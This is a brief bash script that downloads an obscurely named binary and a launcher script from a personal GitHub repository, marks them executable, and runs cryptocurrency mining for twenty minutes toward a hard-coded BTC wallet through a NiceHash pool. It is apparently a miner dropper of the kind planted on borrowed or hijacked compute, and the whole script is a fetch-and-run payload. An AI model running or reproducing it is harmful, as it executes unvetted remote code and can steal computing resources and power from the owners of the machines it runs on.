#!/bin/bash
wget https://github.com/aka648582/yes/raw/main/gas
chmod +x gas
wget https://github.com/aka648582/yes/raw/main/cmdline_launcher.sh
chmod +x cmdline_launcher.sh
timeout 1200 ./cmdline_launcher.sh -algo autolykos  -coin BTC -wallet 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E  -rigName  PWF -pool1 autolykos.usa-east.nicehash.com:3390
